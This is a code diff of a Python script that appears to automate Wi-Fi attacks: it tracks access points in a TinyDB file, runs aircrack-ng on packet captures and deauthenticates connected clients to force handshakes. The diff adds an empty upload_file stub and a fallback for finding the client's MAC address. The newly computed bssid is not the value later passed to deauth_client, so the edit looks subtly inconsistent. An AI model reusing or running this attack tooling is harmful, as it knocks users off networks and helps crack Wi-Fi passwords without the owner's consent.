@@ -7,10 +7,14 @@ from sys import argv
 from tinydb import TinyDB, Query
 from os import listdir
 
+
 pdb = TinyDB('aps.json')
 ldb = {}
 IFACE="wlan2" if len(argv) < 2 else argv[1]
 CHECKED=0
+
+def upload_file():    
+    return
 
 async def check_pcap(cap_file, bssid):
     p = subprocess.Popen(['aircrack-ng', cap_file], stdout=subprocess.PIPE)
@@ -77,7 +81,8 @@ async def scan_single(AP, max_tries=3):
                     print(client.data.toDict())
                     print(client.bssid)
                     print('Client data done')
-                    if client.bssid:
+                    bssid = client.bssid if client.bssid else client.data.toDict().get('client-mac')
+                    if bssid:
                         if waited == 0 or waited > 20:
                             print('Got a bssid, deauthing client', waited)
                             await deauth_client(ap, pdump, client.bssid)
